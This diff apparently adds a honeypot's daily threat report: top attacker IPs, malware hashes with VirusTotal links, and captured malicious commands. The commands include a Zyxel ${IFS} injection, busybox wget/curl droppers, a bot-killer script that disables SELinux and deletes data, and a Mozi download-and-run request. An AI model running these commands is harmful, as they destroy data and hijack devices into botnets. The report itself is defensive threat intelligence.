@@ -1,0 +1,27 @@
+Top 5 IPs for 2024-02-08:
+
+47.100.233.184
+106.105.201.241
+46.229.189.200
+173.52.101.9
+220.133.195.93
+
+Malware download: 
+File name: sshd
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+https://www.virustotal.com/gui/file/26e72314a3c85dcd726ce1119d35279cb252d296cbe95504addd948ad32da9cc
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+Malcious Commands seen:
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;
+cd /data/local/tmp/; busybox wget http://103.67.199.44/w.sh; sh w.sh; curl http://103.67.199.44/c.sh; sh c.sh; wget http://103.67.199.44/wget.sh; sh wget.sh; curl http://103.67.199.44/wget.sh; sh wget.sh; busybox wget http://103.67.199.44/wget.sh; sh wget.sh; busybox curl http://103.67.199.44/wget.sh; sh wget.sh
+
+kill -9 $(ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(sh)/ && $2 > 15 && $1 != '$$' {print $1}');pkill -9 arm;pkill -9 arm5;pkill -9 arm6;pkill -9 arm7;pkill -9 spc;pkill -9 sh4;pkill -9 mpsl;pkill -9 mips;pkill -9 x86;pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/tmp || cd /data/local/tmp; rm -rf *;su 0 iptables -9;setenforce 0;busybox wget http://103.155.81.228/jack5tr.sh || su 0 busybox wget http://103.155.81.228/jack5tr.sh;chmod 777 jack5tr.sh || su 0 chmod 777 jack5tr.sh;sh jack5tr.sh;su 0 mv /data/local/tmp /data/local/tmp;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
+/shell?cd+/tmp;rm+-rf+*;wget+http://112.248.83.164:45267/Mozi.7;chmod+777+Mozi.7;/tmp/Mozi.7+jaws
+
